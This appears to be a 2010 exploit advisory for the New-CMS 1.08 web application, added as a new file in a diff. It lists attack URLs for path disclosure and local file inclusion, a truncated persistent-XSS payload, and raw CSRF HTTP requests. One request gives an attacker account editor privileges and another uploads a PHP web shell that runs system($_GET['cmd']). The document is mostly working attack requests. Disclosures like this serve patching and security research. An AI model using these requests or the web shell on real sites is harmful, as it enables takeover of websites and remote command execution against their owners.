@@ -1,0 +1,94 @@
+#
+#
+# Multiple Vulnerability in New-CMS
+#
+# [Vendor SW]: New-CMS
+# [Version]: 1.08 (but possible all versions)
+# [Vendor URL]: www.new-cms.org
+# [Tested on]: Ubuntu Server 9.10
+# [Category]: Webapps/0day
+#
+# [Date]: 17 Feb 2010
+# [Author]: Alberto "fulgur" Fontanella
+# [Author URL]: ictsec.wordpress.com
+# [Author EMAIL]: itsicurezza<0x40>yahoo.it
+#
+#
+
+
+[ 1 ] - [ Full Path Disclosure ]
+
+http://[host]/struttura/ricerca.php
+http://[host]/pdf.php
+http://[host]/index.php?lng=it&pg=manager
+...etc
+
+Fatal error: Call to undefined function ListaFile() in
+/var/www/struttura/ricerca.php on line 8
+
+
+[ 2 ] - [ Local File Inclusion ]
+
+http://[host]/index.php?pg=cmd
+
+You have to put cmd.php in /struttura/
+
+http://[host]/pdf.php?lng=cmd.php
+http://[host]/newcms/struttura/manager.php?lng=cmd.php
+http://[host]/newcms/struttura/editor/quote.php?lng=cmd.php
+...etc
+
+You have to put cmd.php.str in /lingue/
+
+
+[ 3 ] - [ Persistent XSS ]
+
+Write an Article/News and Put in the Title field:
+
+">
+
+
+
+[ 4 ] - [ XSRF ]
+
+To give privileges to an User Account:
+
+POST /index.php?lng=it&pg=admin&s=redattori HTTP/1.1
+Host: [host]
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://[host]/index.php?lng=it&pg=admin&s=redattori
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+azione=new&add_red=Haxor&opt1=on&opt2=on&opt3=on&opt4=on&opt5=on
+
+To upload a PHP Shell:
+
+POST /struttura/manager.php?lng=it&upload=ok&id=indirizzo_0 HTTP/1.1
+Host: [host]
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://[host]/struttura/manager.php?lng=it&id=indirizzo_0
+Content-Type: multipart/form-data;
+boundary=---------------------------213917452311081853951240913053
+Content-Length: 424
+
+-----------------------------213917452311081853951240913053
+Content-Disposition: form-data; name="radice"
+Content-Disposition: form-data; name="per"
+
+
+-----------------------------213917452311081853951240913053
+Content-Disposition: form-data; name="file"; filename="cmd9.php"
+Content-Type: application/x-httpd-php
+
+<?php
+system($_GET['cmd']);
+?>
+
+-----------------------------213917452311081853951240913053--
